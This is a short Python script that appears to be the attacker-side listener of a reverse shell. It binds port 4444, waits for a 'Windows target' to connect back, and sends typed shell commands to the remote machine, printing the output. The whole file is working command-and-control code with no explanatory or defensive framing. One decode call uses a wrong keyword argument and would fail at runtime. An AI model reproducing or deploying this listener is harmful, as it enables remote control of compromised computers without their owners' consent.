# this file will be running on the linux server

#!/usr/bin/env python

import socket


def handle_client(client_socket):
    while True:
        try:
            cmd = input("SHELL> ")

            client_socket.send(cmd.encode() + b"\n")
            if cmd.lower() in ["exit", "quit"]:
                break
            response = client_socket.recv(4096).decode("utf-8", error="ignore")
            print(response)

        except Exception as e:
            print(f"[!]Crazy shit happened: {e}")
            break

    client_socket.close()


def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)

    print("[*] Listening on port 4444")
    print("[*] Waiting for Windows target to connect...")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Client connected from {addr[0]}:{addr[1]}")

        handle_client(client_socket)


if __name__ == "__main__":
    server_loop()
